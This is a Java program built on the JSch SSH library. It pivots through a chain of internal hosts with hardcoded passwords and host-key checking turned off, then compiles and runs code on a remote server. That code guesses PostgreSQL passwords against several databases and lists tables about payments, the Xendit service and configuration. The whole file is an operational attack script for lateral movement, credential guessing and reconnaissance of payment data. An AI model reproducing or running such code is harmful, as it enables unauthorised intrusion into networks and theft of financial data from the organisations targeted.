import com.jcraft.jsch.*;
import java.io.*;
class DKNEO6 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    // Write Java DB query on NEO server using its own PG JDBC driver
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 \"cd /tmp;echo \\\"import java.sql.*;class X{public static void main(String[] a)throws Exception{Class.forName(\\\\\\\"org.postgresql.Driver\\\\\\\");String[] dbs={\\\\\\\"neo\\\\\\\",\\\\\\\"noxify\\\\\\\",\\\\\\\"nucleus\\\\\\\"};String[] ps={\\\\\\\"kutul0nc4t\\\\\\\",\\\\\\\"postgres\\\\\\\",\\\\\\\"atlassian\\\\\\\"};for(String d:dbs)for(String pw:ps){try{Connection c=DriverManager.getConnection(\\\\\\\"jdbc:postgresql://10.13.17.248:5501/\\\\\\\"+d,\\\\\\\"postgres\\\\\\\",pw);System.out.println(\\\\\\\"OK \\\\\\\"+d+\\\\\\\":\\\\\\\"+pw);Statement s=c.createStatement();ResultSet r=s.executeQuery(\\\\\\\"SELECT tablename FROM pg_tables WHERE schemaname=\\\\\\\\\\\\\\\"public\\\\\\\\\\\\\\\" AND (tablename LIKE \\\\\\\\\\\\\\\"%%xendit%%\\\\\\\\\\\\\\\" OR tablename LIKE \\\\\\\\\\\\\\\"%%config%%\\\\\\\\\\\\\\\" OR tablename LIKE \\\\\\\\\\\\\\\"%%payment%%\\\\\\\\\\\\\\\") ORDER BY tablename\\\\\\\");while(r.next())System.out.println(r.getString(1));c.close();return;}catch(Exception e){}}System.out.println(\\\\\\\"ALL FAILED\\\\\\\");}}\\\" > X.java;PG_JAR=\\$(find /progs/neo/ -name \\\"postgresql*.jar\\\" | head -1);echo PG_JAR=\\$PG_JAR;/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/javac -cp \\$PG_JAR X.java 2>&1;/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/java -cp \\$PG_JAR:. X 2>&1\" 2>&1' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
